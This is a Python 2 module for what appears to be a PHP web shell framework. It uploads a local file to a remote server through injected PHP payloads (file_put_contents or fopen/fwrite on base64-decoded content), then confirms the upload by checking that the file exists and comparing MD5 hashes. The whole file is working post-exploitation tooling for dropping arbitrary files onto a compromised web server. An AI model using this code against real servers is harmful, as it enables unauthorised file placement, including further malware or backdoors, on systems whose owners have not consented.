from core.vectors import PhpCmd, ModuleCmd
from core.module import Module
from core import messages
from core.loggers import log
import random
import hashlib
import base64


class Upload(Module):

    """Upload file to remote filesystem."""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_vectors(
            [
            PhpCmd(
              "(file_put_contents('${rpath}',base64_decode('${content}'))&&print(1))||print(0);",
              name = 'file_put_contents'
              ),

            PhpCmd(
              """($h=fopen("${rpath}","a+")&&fwrite($h,base64_decode('${content}'))&&fclose($h)&&print(1))||print(0);""",
              name = "fwrite"
              )
            ]
        )

        self.register_arguments([
          { 'name' : 'lpath', 'help' : 'Local file path' },
          { 'name' : 'rpath', 'help' : 'Remote file path' },
          { 'name' : '-content', 'default' : ''},
          { 'name' : '-vector', 'choices' : self.vectors.get_names(), 'default' : 'file_put_contents' }
        ])

    def run(self, args):

        # Load local file
        content_orig = args.get('content')
        if not content_orig:

            lpath = args.get('lpath')

            try:
                content_orig = open(lpath, 'r').read()
            except Exception, e:
                log.warning(
                  messages.generic.error_loading_file_s_s % (lpath, str(e)))
                return

        args['content'] = base64.b64encode(content_orig)

        # Check remote file existence
        rpath_exists = ModuleCmd('file_check', [ args['rpath'], 'exists' ]).run()
        if rpath_exists:
            log.warning(messages.generic.error_file_s_already_exists % args['rpath'])
            return

        vector_name, result = self.vectors.find_first_result(
         format_args = args,
         condition = lambda result: True if result == '1' else False
        )

        if not ModuleCmd('file_check', [ args['rpath'], 'exists' ]).run():
            log.warning(messages.module_file_upload.failed_upload_file)
            return

        if not (
          ModuleCmd('file_check', [ args['rpath'], 'md5' ]).run() ==
          hashlib.md5(content_orig).hexdigest()
          ):
            log.warning(messages.module_file_upload.failed_md5_check)
            return
